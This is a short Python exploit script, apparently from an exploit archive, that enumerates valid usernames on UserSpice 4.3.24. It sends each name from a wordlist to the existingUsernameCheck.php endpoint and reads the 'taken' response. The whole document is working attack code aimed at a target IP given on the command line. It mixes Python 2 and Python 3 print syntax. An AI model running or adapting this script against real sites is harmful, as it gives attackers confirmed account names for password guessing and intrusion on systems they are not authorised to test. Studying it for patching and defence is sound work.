# Exploit Title: userSpice 4.3.24 - Username Enumeration
# Date: 2018-06-10
# Author: Dolev Farhi
# Vendor or Software Link: www.userspice.com
# Version: 4.3.24
# Tested on: Ubuntu

import sys
import os.path
import requests

print("[+] UserSpice 4.3.24 Username Enumeration")

if len(sys.argv) != 3:
	print 'Usage:', sys.argv[0], 'ip.add.re.ss', 'usernames.txt'
	sys.exit(1)

if not os.path.exists(sys.argv[2]):
	print('usernames.txt does not exist')
	sys.exit(1)

headers = {
	'Origin':'http://' + sys.argv[1],
	'X-Requested-With':'XMLHttpRequest'
}

print('Checking usernames...')

f = open(sys.argv[2], 'r')

for user in f:
	user = user.strip()
	req = requests.post('http://'+sys.argv[1]+'/users/parsers/existingUsernameCheck.php', headers=headers ,
		 																				  data={"username":user})
	if 'taken' in req.text:
		print('[FOUND] ' + user)
	else:
		print('[NOT FOUND] ' + user)